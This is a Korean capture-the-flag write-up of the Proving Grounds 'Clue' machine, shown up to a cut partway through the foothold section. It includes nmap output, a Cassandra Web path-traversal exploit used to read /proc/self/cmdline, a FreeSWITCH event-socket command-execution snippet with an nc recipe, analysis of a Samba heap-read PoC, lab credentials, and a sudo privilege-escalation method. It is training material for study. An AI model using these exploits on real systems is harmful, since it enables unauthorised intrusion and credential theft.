---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/lfi-rfi
  - tech/svc/smb
  - tech/lin/sudo-abuse
  - tech/exec/ssh-key
  - tech/enum/searchsploit
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.115.240
ports: [22, 80, 139, 445, 3000, 8021]
services: [freeswitch-event, http, netbios-ssn, ssh]
status: solved
manual_tags: true
manual_cves: true
tech_count: 6
---
> [!info] PG Practice — Clue · Advanced · **플래그 2/2**
> 타겟 192.168.115.240 (리버트 후 `.178.240` → `.239.240`) · OS Debian 10 buster, 커널 4.19.0-21-amd64 · 호스트명 `clue` (FQDN `clue.pg`)
> **경로 요약** 3000 Cassandra Web 0.5.0 경로 traversal → `/proc/self/cmdline` 에서 `cassie:SecondBiteTheApple330` → SMB `//CLUE/backup` 약탈 → live 설정에서 FreeSWITCH ESL 비밀번호 `StrongClueConEight021` → 8021 ESL `api system` 으로 명령 실행 → `su cassie` → `sudo -u root cassandra-web` 로 같은 취약점을 root 권한으로 재사용 → `/home/anthony/.ssh/id_rsa` → `ssh root@`

**이 박스의 진짜 값어치는 막다른 길 세 개에 있다**

익스플로잇 후보가 셋이었다. Kali 산출물의 타임스탬프로 승패가 확정된다:

| 시각(`~/PG/Clue/` mtime) | 후보 | 결과 |
|---|---|---|
| 06-16 10:27 clone → 10:31 `__pycache__` | `CVE-2021-44142/` (Samba vfs_fruit) | ❌ **막다른 길** — 4분 만에 버려졌다 |
| 06-16 13:58 | `49362.py` (Cassandra Web RFR) | ✅ 성공 — 자격증명 채굴의 출발점 |
| 06-16 16:47 | `47799.py` (FreeSWITCH ESL) | ✅ 성공 — 단, **원문 그대로는 실패한다.** 손으로 고쳐야 했다 |
| 06-22 13:12 | `id_rsa` | ✅ root |

`__pycache__` 가 clone보다 4분 늦다는 것은 **`check_vulnerable.py` 를 실제로 실행했다**는 증거다(임포트가 컴파일됐다). 그리고 그 뒤로 그 디렉터리에 아무 일도 일어나지 않았다. §2-6과 §6-①에서 왜 처음부터 될 수 없었는지를 소스와 벤더 어드바이저리로 확정한다.

> [!warning] 관측된 것과 재구성한 것 · 그리고 IP가 세 번 바뀐다
> - **실증됨** — §1 nmap(`nmap.log` 대조) · §2 익스플로잇 메커니즘(디스크의 `49362.py`·`47799.py`·`CVE-2021-44142/apple.py` 원문) · §2-5 ESL ACL(SMB로 약탈한 실제 설정 파일) · §4 `sudo -l`(스크린샷) · §6 시행착오 명령(`~/.zsh_history` 회수) · §6 도구 동작(Kali에서 직접 실행)
> - **원본 노트 보존** — §3·§4·§5의 터미널 출력은 원본 writeup의 기록을 그대로 옮겼다
> - **IP 변천** — 박스가 리버트되며 `192.168.115.240` → `192.168.178.240` → `192.168.239.240` 로 바뀌었다. 본문의 IP가 장마다 다른 것은 오타가 아니라 실제 기록이다. §6-⑨ 참조

---

## 0. 이 박스에서 배우는 것

- **`/proc/self/cmdline` 은 파일 읽기 취약점의 최우선 목표다** — 자격증명이 CLI 인자로 넘어가는 서비스는 프로세스 인자에 평문으로 박혀 있다
- **백업은 현재 상태가 아니다** — SMB에서 훔친 설정 파일의 비밀번호(`ClueCon`)는 틀렸다. 같은 파일의 live 버전에는 다른 값이 들어 있었다
- **같은 취약점을 두 번, 다른 권한으로 쓴다** — 이 박스의 권한상승은 새 취약점이 아니라 §2의 traversal을 root 권한 프로세스에 다시 거는 것이다. 이 발상이 이 박스의 핵심이다
- **키 파일의 주석은 소유자가 아니다** — `anthony@clue` 라고 적힌 키로 로그인되는 계정은 root 였다
- **공개 PoC는 그대로 돌아가지 않는다** — `47799.py` 는 하드코딩된 비밀번호를 고쳐야 했고, 고친 뒤에도 주석은 거짓말로 남는다
- **막다른 길을 4분 만에 접는 법** — CVE-2021-44142는 버전은 맞았지만 설정 게이트가 안 맞았다. 버전만 보고 던지면 안 되는 이유

> [!tip] 시험 출제 가능성
>
> | 요소 | 출제 가능성 | 이유 |
> |---|---|---|
> | 디렉터리 traversal → 파일 읽기 → 자격증명 | 매우 높음 | 시험 단골. `/proc/self/cmdline`·`/proc/self/environ`·설정 파일이 표준 목표다 |
> | 훔친 자격증명의 재사용(SMB↔SSH↔서비스) | 매우 높음 | 자격증명 하나로 **모든 서비스를 전부 시도**하는 것이 시험의 기본 반사다 |
> | `sudo -l` NOPASSWD 바이너리 악용 | 매우 높음 | GTFOBins에 없는 바이너리도 나온다. **그 프로그램이 무엇을 하는지**로 풀어야 한다 — 이 박스가 정확히 그 경우다 |
> | SSH 개인키 → 로그인 | 매우 높음 | 키를 주웠으면 **모든 사용자 이름으로 시도**한다. 주석을 믿지 않는다 |
> | FreeSWITCH·Cassandra Web | 낮음 | 제품은 안 나온다. "관리 소켓이 인증만 통과하면 명령을 실행해 준다" 는 유형이 나온다 |
>
> 변형은 이런 모습이다 — Cassandra Web 대신 임의 Rack/Sinatra 앱, ESL 대신 Redis(`6379`)·Docker API(`2375`)·Jenkins CLI. **"관리 포트 + 약한 인증 = 명령 실행"** 은 같다.

---

## 1. 정찰

### 1-1. Nmap

`nnmap` 은 오타가 아니라 별칭이다 (`~/.zshrc:247`):

```
alias nnmap='nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log'
```

```bash
kali@kali:~/PG/Clue$ nnmap 192.168.115.240
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-15 15:42 +0900
Nmap scan report for 192.168.115.240
Host is up (0.067s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http             Apache httpd 2.4.38
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn      Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3000/tcp open  http             Thin httpd
|_http-title: Cassandra Web
|_http-server-header: thin
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: clue
|   NetBIOS computer name: CLUE\x00
|   Domain name: pg
|   FQDN: clue.pg
|_  System time: 2026-06-15T02:43:49-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h20m01s, deviation: 2h18m37s, median: 0s
| smb2-time:
|   date: 2026-06-15T06:43:46
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   66.74 ms 192.168.45.1
2   66.65 ms 192.168.45.254
3   67.31 ms 192.168.251.1
4   67.39 ms 192.168.115.240

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.98 seconds
```

### 1-2. 이 출력에서 읽어야 할 것 — 공격면 6개의 우선순위

`Not shown: 65529 filtered tcp ports (no-response)` — Flu는 `closed ... (reset)` 이었는데 여기는 `filtered ... (no-response)` 다. **방화벽이 앞에 있다**는 뜻이고, 그래서 nmap이 OS 지문을 못 잡았다(`could not find at least 1 open and 1 closed port`). 열린 6개 외에는 아무 응답도 안 온다 — 즉 리버스셸의 아웃바운드도 의심 대상이다.

| 포트 | 판정 | 우선순위와 이유 |
|---|---|---|
| **3000** Thin httpd, `http-title: Cassandra Web` | 제품명이 제목에 그대로 | **1순위.** 제품명 + 소규모 OSS = exploit-db 적중률 최고 |
| **8021** `freeswitch-event FreeSWITCH mod_event_socket` | nmap이 정확히 지문 식별 | **2순위.** ESL은 인증만 통과하면 명령을 실행해 주는 관리 소켓이다 |
| 445/139 Samba 4.9.5-Debian | 버전 확정 | 3순위. 자격증명이 생기면 즉시 돌아온다 |
| 80 Apache 2.4.38, 403 Forbidden | 루트가 막혀 있다 | 4순위. 디렉터리 열거 대상 |
| 22 OpenSSH 7.9p1 | Debian 10 확정 | 자격증명 대기 |

**`Service Info: Hosts: 127.0.0.1, CLUE` 와 `Domain name: pg`**

`smb-os-discovery` 가 호스트명 `clue`, FQDN `clue.pg` 를 그냥 알려준다. **인증 없이** 얻는 정보다.
그리고 `OS: Windows 6.1 (Samba 4.9.5-Debian)` — Windows가 아니다. Samba가 하위 호환을 위해 Windows 7 문자열을 광고하는 것이다. 여기에 속아 Windows 익스플로잇을 찾으면 시간을 태운다.

### 1-3. Cassandra Web — 버전 판정

```bash
┌──(kali㉿kali)-[~/PG/Clue]
└─$ searchsploit cassandra
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
Atrium Software Cassandra NNTP Server 1.10 - Buffer Overflow        | windows/dos/19884.txt
Cassandra Web 0.5.0 - Remote File Read                              | linux/webapps/49362.py
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

┌──(kali㉿kali)-[~/PG/Clue]
└─$ searchsploit -m 49362
  Exploit: Cassandra Web 0.5.0 - Remote File Read
      URL: https://www.exploit-db.com/exploits/49362
     Path: /usr/share/exploitdb/exploits/linux/webapps/49362.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/PG/Clue/49362.py
```

![[Pasted image 20260616140217.png]]

> [!warning] 버전 근거가 1개뿐이다 — 이 박스가 운이 좋았던 지점
> nmap은 `http-title: Cassandra Web` 만 알려줬을 뿐 버전은 말하지 않았다. exploit-db에 Cassandra Web 항목이 하나뿐이라 자연히 0.5.0을 골랐고, 결과적으로 맞았다.
> **이건 판정이 아니라 도박이었다.** 사후에 `/proc/self/cmdline` 이 `ruby2.5 ... cassandra-web` 을 보여줬고, 익스플로잇의 traversal 깊이 상수(§2-2)가 실제 gem 경로 깊이와 맞아떨어진 것이 사후 검증이 됐다.
> `Codes: N/A` · `Verified: False` 에도 주목하라 — CVE 번호가 없고 EDB가 검증도 안 한 익스플로잇이다. 누적 교훈 2번("버전 판정은 독립 근거 2개")을 만족하지 못한 채 던진 것이다. [[Hub]] · [[Levram]] 참조.

---

## 2. 취약점 분석

### 2-1. 배경 지식 — Rack::Protection 과 **경로 traversal**

Cassandra Web은 Ruby(Sinatra/Rack) 기반 웹 UI이고, 정적 자산을 gem 안의 `app/public` 디렉터리에서 서빙한다. 익스플로잇 저자의 설명이 정확하다 (디스크의 `49362.py` 주석 원문):

```
# Cassandra Web is vulnerable to directory traversal due to the disabled
# Rack::Protection module. Apache Cassandra credentials are passed via the
# CLI in order for the server to auth to it and provide the web access, so
# they are also one thing that can be captured via the arbitrary file read.
```

**핵심은 두 문장이다:**

1. `Rack::Protection` 이 **꺼져 있다** — 이 미들웨어 묶음에 `Rack::Protection::PathTraversal` 이 들어 있고, 그것이 요청 경로의 `../` 를 정규화해 주는 역할을 한다. 꺼 두면 정적 파일 핸들러가 `../` 가 든 경로를 그대로 파일시스템 경로로 이어붙인다.
2. **자격증명이 CLI 인자로 넘어간다** — 그래서 파일 읽기만으로 자격증명이 샌다. 이게 §2-3이다.

**이 결함에는 CVE 번호가 없다**

EDB 49362의 `Codes: N/A` 가 그 표시다. 저자는 GitHub 저장소와 v0.6.0에서 고쳐졌다고만 적었다.
CVE가 없다고 안 위험한 게 아니다. 그리고 이 노트의 프론트매터에 `cves:` 항목이 아예 없는 이유이기도 하다 — 이 박스를 뚫은 것 중 CVE 번호가 붙은 것은 **하나도 없다.**

### 2-2. 왜 `../` 를 여덟 번인가 — 상수의 의미

익스플로잇 상단의 상수와 그 위 주석이다 (원문):

```python
SIGNATURE = 'cassandra.js'

#
# /var/lib/gems/2.7.0/gems/cassandra-web-0.5.0/app/public
#
DT = '../'
DT_NUM = 8
```

**주석이 곧 계산 근거다.** 서빙 루트 `/var/lib/gems/2.7.0/gems/cassandra-web-0.5.0/app/public` 에서 `/` 까지 올라가려면:

```
public(1) → app(2) → cassandra-web-0.5.0(3) → gems(4)
  → 2.7.0(5) → gems(6) → lib(7) → var(8)     = 8 단계
```

**타겟의 루비는 2.5 였는데 왜 8이 그대로 맞았나**

`/proc/self/cmdline` 이 `/usr/bin/ruby2.5` 를 보여줬으니 실제 경로는 `.../gems/2.5.0/gems/...` 다. 버전 문자열만 다르고 깊이는 같다 — 그래서 8이 그대로 통했다.

그리고 초과 traversal은 무해하다. POSIX에서 `/..` 는 `/` 다. 루트에 도달한 뒤의 `../` 는 아무 일도 하지 않는다.
그래서 애매하면 넉넉하게 넣는 것이 정답이다 — §4에서 손으로 칠 때 9개를 쓴 이유다. 모자라면 실패하지만 넘쳐도 성공한다.
깊이를 조절해야 하면 `-n` 이 있다: `python 49362.py TARGET /etc/passwd -n 12`

익스플로잇의 판정 로직도 읽어 둘 값어치가 있다 (원문):

```python
if(SIGNATURE not in deskpop.text and self.force == False):
    print("Target doesn't look like Cassandra Web, aborting...")
    return -1
...
if(SIGNATURE in req.text):
    print("Failed to read %s (bad path?)" % self.file)
    return -1
```

**두 검사가 정반대 방향이다.** 먼저 루트 페이지에 `cassandra.js` 가 **있어야** 타겟으로 인정하고(`-f` 로 무시 가능), 그다음 traversal 응답에 `cassandra.js` 가 **없어야** 성공으로 친다 — 있으면 traversal이 씹혀서 그냥 index를 돌려받은 것이기 때문이다. 영리한 판정이다.

### 2-3. `/proc/self/cmdline` — 파일 읽기의 최대어

임의 파일 읽기를 얻으면 `/etc/passwd` 로 **동작 확인**을 하고, 곧바로 `/proc/self/cmdline` 로 간다.

```
/proc/<pid>/cmdline  →  그 프로세스의 argv 전체 (NUL 로 구분)
/proc/self/cmdline   →  "읽고 있는 나 자신" = 여기서는 웹 서버 프로세스
```

Cassandra Web은 백엔드 Cassandra DB에 붙기 위한 자격증명을 **커맨드라인 인자로** 받는다. 그래서 argv에 평문으로 있다.

#### `ps aux` 로 자격증명이 보인다면, `/proc/*/cmdline` 로도 보인다

이건 Cassandra Web의 결함이 아니라 **커널이 제공하는 정상 동작**이다. 어떤 프로그램이든 비밀을 CLI 인자로 받으면 같은 호스트의 모든 사용자에게 노출된다.

파일 읽기를 얻었을 때의 표준 목표 목록:

| 경로 | 무엇이 나오나 |
|---|---|
| `/proc/self/cmdline` | 그 서비스 자신의 argv ← 이 박스의 정답 |
| `/proc/self/environ` | 환경변수 (DB URL·토큰·`AWS_SECRET_*`) |
| `/proc/self/cwd/<파일>` | 앱 작업 디렉터리 기준 상대 경로 접근 |
| `/proc/sched_debug` · `/proc/net/tcp` | 다른 프로세스의 PID 목록 → `/proc/<pid>/cmdline` 으로 확장 |
| `/etc/passwd` | 사용자 목록 + 홈 경로 (동작 확인 겸용) |
| `~/.ssh/id_rsa` · `~/.bash_history` | 키와 명령 이력 |
| 앱 설정 파일 | DB 비밀번호 |

익스플로잇 자신의 `-h` 도움말이 `/proc/sched_debug + /proc/<cass-web-pid>/cmdline` 을 예시로 적어 둔 것은 그래서다.

### 2-4. FreeSWITCH ESL — "인증하면 명령을 실행해 주는" 소켓

`mod_event_socket` 은 FreeSWITCH의 관리·이벤트 인터페이스로 기본 8021/tcp 에서 돈다. 프로토콜은 **줄 기반 평문**이고, `47799.py` 가 하는 일 전부가 이것이다 (디스크 원문):

```python
s.connect((ADDRESS, 8021))
response = s.recv(1024)
if b'auth/request' in response:
    s.send(bytes('auth {}\n\n'.format(PASSWORD), 'utf8'))
    response = s.recv(1024)
    if b'+OK accepted' in response:
        print('Authenticated')
        s.send(bytes('api system {}\n\n'.format(CMD), 'utf8'))
```

| 단계 | 와이어에 흐르는 것 | 의미 |
|---|---|---|
| 1 | 서버 → `Content-Type: auth/request` | 접속하면 서버가 먼저 인증을 요구한다 |
| 2 | 클라 → `auth <password>\n\n` | 사용자 이름이 없다. 비밀번호 하나뿐이다 |
| 3 | 서버 → `+OK accepted` | 통과 |
| 4 | 클라 → `api system <cmd>\n\n` | **`system` API 가 셸 명령을 그대로 실행한다** |

#### 빈 줄 두 개(`\n\n`)가 프로토콜의 종결자다

ESL은 명령을 **빈 줄로 끝낸다.** `\n` 하나만 보내면 서버가 계속 기다리고 아무 일도 안 일어난다.
그래서 이 익스플로잇은 `nc` 로도 손으로 재현된다 — 시험에서 스크립트를 못 쓰는 상황의 수동 대안이다:

```
nc 192.168.115.240 8021
auth StrongClueConEight021
(빈 줄)
api system id
(빈 줄)
```

취약점이라 부를 것도 없다. `api system` 은 문서에 있는 정상 기능이다. 결함은 이 소켓이 원격에서 도달 가능하고 비밀번호만으로 열린다는 배치에 있다.

### 2-5. 왜 원격에서 되는가 — 익스플로잇 헤더의 주장을 실제 설정으로 반증한다

`47799.py` 헤더는 이렇게 단언한다 (원문):

```
# FreeSWITCH listens on port 8021 by default and will accept and run commands sent to
# it after authenticating. By default commands are not accepted from remote hosts.
```

**"기본적으로 원격 호스트의 명령은 받지 않는다"** — 이 주장이 이 박스에서 성립하는지 확인할 방법이 있다. SMB로 약탈한 `/etc/freeswitch` 트리에 **설정 파일 실물**이 있다:

```bash
┌──(kali㉿kali)-[~/PG/Clue]
└─$ cat freeswitch/etc/freeswitch/autoload_configs/event_socket.conf.xml
<configuration name="event_socket.conf" description="Socket Client">
  <settings>
    <param name="nat-map" value="false"/>
    <param name="listen-ip" value="::"/>
    <param name="listen-port" value="8021"/>
    <param name="password" value="ClueCon"/>
    <!--<param name="apply-inbound-acl" value="loopback.auto"/>-->
    <!--<param name="stop-on-bind-error" value="true"/>-->
  </settings>
</configuration>
```

#### 원격 차단의 정체는 `apply-inbound-acl` 이고, 주석 처리되어 출하된다

원격 접속을 막는 것은 `apply-inbound-acl = loopback.auto` 다. 위 파일에서 그 줄은 **`<!-- -->` 안에 있다** — 즉 적용되지 않는다.
게다가 `listen-ip` 가 `::`(모든 인터페이스)다. 기본 설정이 이미 원격에 열려 있다.

즉 익스플로잇 헤더의 *"By default commands are not accepted from remote hosts"* 는 이 배포판의 설정 파일과 맞지 않는다. 저자는 Windows 인스톨러(x64 MSI)에서 시험했고 — 헤더의 `Software Link` 가 그것이다 — 배포판마다 출하 설정이 다르다.

이것이 표준의 "단정형 일반 지식은 때려보고 넣는다" 규칙이 필요한 이유다. 벤더 문서나 익스플로잇 주석의 "기본값은 이렇다"는 **그 배포판·그 버전의 실제 파일**로만 확인된다. 여기서는 운 좋게 타겟의 설정 파일 자체를 손에 넣어 확인할 수 있었다.

그리고 live 설정은 이것과 또 다르다 (§3-4에서 traversal로 읽은 것):

| 항목 | SMB 백업본 | live (`/etc/freeswitch/...`) |
|---|---|---|
| `listen-ip` | `::` | `0.0.0.0` |
| `password` | `ClueCon` (FreeSWITCH 기본값) | **`StrongClueConEight021`** |
| `apply-inbound-acl` | 주석 처리됨 | 줄 자체가 없음 |

**백업이 현재가 아니다.** §6-⑤가 이 함정의 기록이다.

### 2-6. 막다른 길의 해부 — CVE-2021-44142 (Samba vfs_fruit)

**이 절은 실패한 시도의 분석이다.** 실행한 것은 `check_vulnerable.py` 한 번뿐이고 **그 출력은 남아 있지 않다.** 아래 메커니즘 설명은 전부 디스크의 PoC 소스(`~/PG/Clue/CVE-2021-44142/apple.py`·`check_vulnerable.py`·`README.md`)와 Samba 어드바이저리에서 온 것이다. 이 박스에서 관측된 것이 아니다.

**무엇인가.** Samba의 `vfs_fruit` 모듈(macOS/Time Machine 호환 계층)이 확장 속성(EA)에 저장된 **AppleDouble 메타데이터를 파싱할 때** 생기는 힙 경계 밖 읽기/쓰기다. Pwn2Own Austin 2021에서 Western Digital PR4100을 상대로 쓰였다.

**어디가 터지는가.** AppleDouble 헤더는 엔트리마다 `(entry_id, offset, length)` 3연조를 담는다. `vfs_fruit` 이 그 **offset/length를 검증 없이 신뢰**하고 버퍼에서 읽어 간다. PoC의 `make_malicious_apple_double()` 이 정확히 그 지점을 겨눈다 (원문 주석 포함):

```python
    # We must have 8 entries. If the size of the xattr does not 402, samba will delete it on read
    # (ID, LEN, OFFSET)
    entry_list = [
        # vulnerable offset, point to end of buffer 401
        (ADEID_FINDERI, 1, 401),
        ...
    ]
    assert len(b) == 402, f"len(b) == {len(b)}"
```

전체 xattr는 402바이트인데 `ADEID_FINDERI` 엔트리의 offset을 401(버퍼 끝)로 지정한다. FinderInfo는 규격상 32바이트(`ADEDLEN_FINDERI = 32`)를 읽으므로 `401 + 32 = 433 > 402` — **31바이트를 버퍼 밖에서 읽는다.** 그 밖에 놓인 것이 talloc 청크 헤더라 힙 쿠키와 연결리스트 포인터가 새어 나온다. `check_vulnerable.py` 의 `looks_like_heap_pointer()` 가 유저스페이스 범위·NULL 페이지 아님·16바이트 정렬을 검사해 "포인터답다"고 판정하는 것이 그 확인이다.

읽어 내는 통로는 **NTFS 대체 데이터 스트림 문법**이다 — `Open(tree, f"{filename}:AFP_AfpInfo")` 로 EA 스트림을 열고 `afp_file.read(0, 0x3c)` 로 60바이트를 받는다. 그 60바이트의 FinderInfo 자리(오프셋 16부터 32바이트)가 곧 OOB로 읽힌 힙 내용이다.

#### 왜 이 박스에서는 처음부터 될 수 없었나 — 버전이 아니라 설정 게이트다

Samba 어드바이저리를 확인했다:

| 항목 | 어드바이저리 | Clue |
|---|---|---|
| 영향 버전 | 4.13.17 미만 전부 (수정: 4.13.17 / 4.14.12 / 4.15.5) | Samba 4.9.5-Debian → **범위 안이다** ✅ |
| 필수 설정 | 공유에 `vfs_fruit` 이 로드되고 `fruit:metadata=netatalk` 또는 `fruit:resource=file` (둘 다 기본값) | 확인 불가 ❌ |
| 필요 권한 | 파일의 확장 속성에 쓰기 가능한 사용자 (guest 포함 가능) | 게스트 쓰기 여부 불명 ❌ |
| 대상 공유 | 실재하는 공유 이름 | **`TimeMachineBackup` 은 이 박스에 없다** ❌ |

**즉 버전은 맞았고 나머지가 전부 안 맞았다.** 특히 마지막 줄이 결정적이다 — §6-①에서 보듯 공유 이름을 README 예시에서 그대로 복사했다.

`fruit:metadata=netatalk` 가 전제인 이유는 이 값이 메타데이터를 Netatalk 호환 형식, 즉 `org.netatalk.Metadata` 확장 속성의 AppleDouble 블롭으로 저장하게 만들기 때문이다. 그 파서가 터지는 코드다. 값이 `stream` 이면 애초에 AppleDouble을 파싱하지 않으므로 **취약 코드에 도달하지 않는다.**
[가정] Debian 기본 `smb.conf` 는 `vfs objects` 에 `fruit` 을 넣지 않는다 — 옵트인 모듈이다. 그렇다면 공유 이름이 맞았더라도 실패했을 것이다. 타겟이 정지돼 `smb.conf` 로 확인하지 못했다.

**일반화: "버전이 취약 범위에 든다"는 필요조건이지 충분조건이 아니다.** 설정 게이트가 있는 CVE는 그 게이트를 먼저 확인한다. 확인 비용이 익스플로잇 시도 비용보다 싸다.

### 2-7. 권한상승의 발상 — 같은 취약점을 다른 권한으로 다시 건다

이 박스의 권한상승에는 **새 취약점이 없다.** 재료는 두 개다:

```
① cassie 는 sudo NOPASSWD 로 /usr/local/bin/cassandra-web 을 실행할 수 있다
② cassandra-web 0.5.0 은 임의 파일 읽기 취약점이 있다   ← §2-1, 이미 쓴 그것
```

`①` 로 `②` 를 **root 권한으로 다시 띄우면**, 그 프로세스의 파일 읽기 능력이 곧 root의 파일 읽기 능력이 된다.

```
[기존] cassie 권한 인스턴스 :3000  ──traversal──▶ cassie 가 읽을 수 있는 파일만
[신규] root  권한 인스턴스 :9999  ──traversal──▶ 파일시스템 전체  ← /home/anthony/.ssh/id_rsa
```

#### 이 사고방식이 이 박스에서 가져갈 가장 큰 것

`sudo -l` 에 GTFOBins에 없는 낯선 바이너리가 뜨면 이렇게 묻는다:
**"이 프로그램이 평소에 하는 일이 뭔가? 그 일을 root 권한으로 하면 무엇이 되는가?"**

| 프로그램의 일 | root 권한이면 |
|---|---|
| 파일을 읽어서 보여준다 (웹 UI·뷰어·로그 도구) | 임의 파일 읽기 ← 이 박스 |
| 파일을 쓴다 (백업·설정 저장) | 임의 파일 쓰기 → `/etc/passwd`·`authorized_keys`·cron |
| 하위 프로세스를 띄운다 (`-e`·`--exec`·플러그인) | 직접 명령 실행 |
| 네트워크로 듣는다 | 그 서비스의 모든 결함이 root 결함이 된다 ← 이 박스가 정확히 이것 |

GTFOBins는 목록이지 사고법이 아니다. **없으면 직접 추론한다.**

---

## 3. Foothold

### 3-1. 파일 읽기 동작 확인 — `/etc/passwd`

```bash
┌──(kali㉿kali)-[~/PG/Clue]
└─$ python 49362.py 192.168.115.240 -p 3000 /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ntp:x:106:113::/nonexistent:/usr/sbin/nologin
cassandra:x:107:114:Cassandra database,,,:/var/lib/cassandra:/usr/sbin/nologin
cassie:x:1000:1000::/home/cassie:/bin/bash
freeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/false
anthony:x:1001:1001::/home/anthony:/bin/bash
```

![[Pasted image 20260616141139.png]]

#### 여기서 뽑아야 할 네 줄 — 이 박스의 지도가 전부 여기 있다

| 줄 | 읽는 법 |
|---|---|
| `cassie:x:1000:1000::/home/cassie:/bin/bash` | UID 1000 = 첫 실사용자. 셸이 있다 → **로그인 대상 1순위** |
| `anthony:x:1001:1001::/home/anthony:/bin/bash` | 두 번째 실사용자. 셸이 있다 → 횡이동 대상. **§4에서 이 홈의 `.ssh/id_rsa` 가 답이 된다** |
| `freeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/false` | 서비스 계정. 홈이 `/var/lib/freeswitch` → **`local.txt` 가 여기 있다**(§5) |
| `cassandra:...:/var/lib/cassandra:/usr/sbin/nologin` | DB 서비스 계정. 로그인 불가 |

**`/bin/bash` 를 가진 계정만 세면 `cassie` 와 `anthony` 둘이다.** 이 박스의 사람 계정은 그 둘뿐이고, 실제 경로가 정확히 `cassie → anthony(의 키) → root` 로 흘렀다.

### 3-2. 자격증명 채굴 — `/proc/self/cmdline`

익스플로잇 소스를 읽다가 저자의 사용 예시에서 힌트를 얻었다:

```bash
kali@kali:~/PG/Clue$ cat 49362.py
# Exploit Title: Cassandra Web 0.5.0 - Remote File Read
# Date: 12-28-2020
# Exploit Author: Jeremy Brown
# Vendor Homepage: https://github.com/avalanche123/cassandra-web
# Software Link: https://rubygems.org/gems/cassandra-web/versions/0.5.0
# Version: 0.5.0
# Tested on: Linux

#!/usr/bin/python
# -*- coding: UTF-8 -*-
#
# cassmoney.py
#
# Cassandra Web 0.5.0 Remote File Read Exploit
#
# Jeremy Brown [jbrown3264/gmail]
# Dec 2020
#
# Cassandra Web is vulnerable to directory traversal due to the disabled
# Rack::Protection module. Apache Cassandra credentials are passed via the
# CLI in order for the server to auth to it and provide the web access, so
# they are also one thing that can be captured via the arbitrary file read.
#
# Usage
# > cassmoney.py 10.0.0.5 /etc/passwd
